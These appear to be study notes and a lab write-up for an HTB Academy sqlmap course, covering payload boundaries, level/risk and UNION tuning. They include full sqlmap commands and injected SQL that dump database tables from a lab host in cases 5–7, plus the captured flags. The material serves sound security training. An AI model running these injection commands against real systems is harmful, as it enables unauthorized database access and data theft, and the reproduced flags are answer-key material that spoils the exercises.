# Section 6 — Attack Tuning

---

## Payload Anatomy

```
[boundary prefix] [VECTOR] [boundary suffix]
        ↓             ↓            ↓
       %'))    UNION SELECT...   -- -
```

- **Vector** — the SQL payload that does the actual work (UNION SELECT, AND 1=1, SLEEP, etc.)
- **Boundaries** — the prefix and suffix that break out of the original query and comment away the rest

---

## Prefix / Suffix

```bash
sqlmap -u "TARGET/?q=test" --prefix="%'))" --suffix="-- -"
```
> Forces a specific prefix and suffix around every payload. Use this when sqlmap's default boundary set doesn't break out of the query's wrapper characters. Replace `TARGET` and the parameter with your target's values, and adjust the prefix/suffix to match the actual query structure.

For the vulnerable code:
```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
```

The injected statement becomes:
```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

> Use `--prefix`/`--suffix` only when the query has unusual wrappers that sqlmap's default boundary set doesn't crack.

---

## Level / Risk

| Flag | Default | Max | What it tunes |
|------|---------|-----|---------------|
| `--level` | 1 | 5 | Number of boundaries + payloads tested (lower expectancy = higher level) |
| `--risk` | 1 | 3 | Adds risky vectors (OR payloads, stacked queries — can modify DB content) |

**Payload count:**
- Default (`--level=1 --risk=1`) → ~72 payloads per parameter
- Max (`--level=5 --risk=3`) → ~7,865 payloads

```bash
# Force testing OR payloads (needed for login pages — disabled by default at risk=1)
sqlmap -u "TARGET" --risk=3

# Test cookies, User-Agent, Referer headers (not tested at level 1)
sqlmap -u "TARGET" --cookie="..." --level=2
```
> `--risk=3` enables OR-based payloads needed for login form injection. `--level=2` makes sqlmap test cookie and header values that it ignores by default. Only raise these above defaults when the default scan finds nothing.

> **Why OR payloads are gated**: They can match all rows. In an `UPDATE` or `DELETE` query (rare but possible), an OR payload can corrupt or wipe the table. Raise `--risk` deliberately when you know the underlying query is `SELECT`.

---

## Advanced Detection Tuning

| Option | Use when |
|--------|----------|
| `--code=200` | TRUE vs FALSE responses differ only by HTTP status code |
| `--titles` | TRUE/FALSE differ only in HTML `<title>` content |
| `--string="success"` | TRUE responses contain a constant string; FALSE don't |
| `--text-only` | Strip HTML tags and compare visible text only (avoids dynamic `<script>`/`<meta>`) |
| `--technique=BEU` | Skip Stacked/Time-based; only test Boolean, Error, UNION |
| `--technique=U` | UNION only (fastest if you know it works) |

---

## UNION SQLi Tuning

| Option | Purpose |
|--------|---------|
| `--union-cols=N` | Skip column-count detection; force N columns |
| `--union-char='a'` | Replace NULL/random-int filler with custom value (when NULLs are filtered) |
| `--union-from=users` | Append `FROM <table>` to UNION (required for Oracle) |
| `--no-cast` | Disable type casting on retrieved data — fixes silent failures with JSON/complex bodies |

---

## Lab — Cases 5, 6, 7

**Target:** `154.57.164.72:30732`

### Case 5 — OR SQLi

OR payloads are disabled by default. They can match every row in a table, which risks corrupting data. Raise `--risk` to 3 to enable them.

```bash
sqlmap -u "http://154.57.164.72:30732/case5.php?id=1" \
  --dbms=mysql --batch --risk=3 --technique=BEU \
  --dump -T flag5
```
> Case 5 uses OR-based injection which sqlmap skips at default risk. `--risk=3` enables OR payloads. `--technique=BEU` tests Boolean, Error, and UNION (skips slow time-based). Replace the IP, port, and table name for other targets.

**flag5:** `HTB{700_much_r15k_bu7_w0r7h_17}`

---

### Case 6 — Non-standard boundaries

The query wraps `col` in a backtick and parenthesis: ``SELECT ... WHERE (`<col>`) ...``. Only the literal `id` returns rows because:
- `` `id` `` is a valid column reference and evaluates as true for non-zero values
- `` `name` `` and similar columns are valid but cast to 0 in a boolean context

You need `--prefix='`)' --suffix='-- -'` to break out of the wrapper. The default level does not include this boundary pair — raise to `--level=4` or higher.

```bash
sqlmap -u "http://154.57.164.72:30732/case6.php?col=id" \
  -p col --dbms=mysql --batch \
  --prefix='`)' --suffix='-- -' \
  --technique=U --level=4 --no-cast \
  --dump -T flag6
```
> Case 6 with non-standard backtick+parenthesis query wrappers. `--prefix='`)` and `--suffix='-- -'` manually specify the break-out characters. `--level=4` makes sqlmap test the boundary pair needed. `--no-cast` prevents silent UNION failures. Replace the IP, port, and table name for other targets.

The injected query becomes:
```sql
SELECT ... WHERE (`id`) UNION ALL SELECT NULL,NULL,NULL,NULL,<data>,NULL-- -`) ...
```

> `--no-cast` required for retrieval (same as Case 4) — without it, sqlmap falls back to partial UNION and fails to dump.

**flag6:** `HTB{v1nc3_mcm4h0n_15_4570n15h3d}`

---

### Case 7 — UNION with adjustments

UNION injection works here, but the default column count detection fails due to type-casting issues. Force `--no-cast` and specify the column count manually.

```bash
sqlmap -u "http://154.57.164.72:30732/case7.php?id=1" \
  --dbms=mysql --batch --technique=U \
  --union-cols=5 --no-cast \
  --dump -T flag7
```
> Case 7 with UNION column count mismatch. `--union-cols=5` forces the column count instead of letting sqlmap auto-detect it. `--no-cast` fixes the type-casting issue that prevents data from being returned. Replace the IP, port, column count, and table name for other targets.

**flag7:** `HTB{un173_7h3_un173d}`

---

## Exam Notes

- Default sqlmap (`--level=1 --risk=1`) covers ~95% of injections — only raise when default fails
- OR injection on a login page → bump `--risk=3` or it'll never test the right payloads
- "Non-standard boundaries" means the query has unusual wrappers (`)`, `]`, `` ` ``, custom delimiters) — use `--prefix`/`--suffix` to break out
- For UNION-only attacks: combine `--technique=U` + `--union-cols=N` + `--no-cast` for the cleanest, fastest run
- When stuck: check the HTB forum for the exact boundary — guessing wastes more time than reading the answer

## Sources

- [HTB Academy — SQLMAP ESSENTIALS — Case6 — Non-standard boundaries (HTB Forum)](https://forum.hackthebox.com/t/htb-academy-sqlmap-essentials-case6-non-standard-boundaries/243441)
